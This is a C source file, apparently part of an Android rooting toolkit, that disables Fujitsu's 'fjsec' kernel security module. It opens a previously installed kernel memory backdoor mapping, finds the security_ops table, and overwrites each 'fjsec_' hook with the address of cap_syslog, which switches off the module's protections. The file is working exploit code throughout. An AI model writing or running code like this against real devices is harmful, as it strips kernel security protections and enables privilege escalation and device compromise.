#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"
#include "kallsyms.h"

#define SECURITY_NAME_MAX       10

#define SECURITY_OPS_OFFSET     ((sizeof (security_ops_tag) + 3) / 4)

#define NUM_SECURITY_OPS        139

#define RESTRICTED_CAP_PREFIX	"fjsec_"
#define DEFAULT_CAP_FUNCTION	"cap_syslog"

static const char security_ops_tag[SECURITY_NAME_MAX + 1] = "fjsec";

bool
unlock_lsm(void)
{
  unsigned long int *security_ops;
  void *fix_func;
  int count = 0;
  int i;

  security_ops = memmem((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE, security_ops_tag, sizeof security_ops_tag);
  if (security_ops == NULL) {
    printf("security_ops: not found\n");
    return false;
  }

  printf("security_ops = %p\n", backdoor_convert_to_kernel_address(security_ops));

  fix_func = kallsyms_get_symbol_address(DEFAULT_CAP_FUNCTION);
  if (fix_func == NULL) {
    printf("fix_func <%s>: not found\n", DEFAULT_CAP_FUNCTION);
    return false;
  }

  for (i = SECURITY_OPS_OFFSET; i < SECURITY_OPS_OFFSET + NUM_SECURITY_OPS; i++) {
    if (security_ops[i]) {
      char *name = kallsyms_get_symbol_by_address((void *)security_ops[i]);
      kallsyms_get_symbol_by_address(NULL);

      printf("0x%08x = 0x%08x <%s>\n", backdoor_convert_to_kernel_address(&security_ops[i]), security_ops[i], name);
      if (name && strncmp(name, RESTRICTED_CAP_PREFIX, sizeof (RESTRICTED_CAP_PREFIX) - 1) == 0) {
      	security_ops[i] = (unsigned long int)fix_func;
      	count++;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  return count > 0;
}

static bool
do_unlock(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = unlock_lsm();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM protect.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
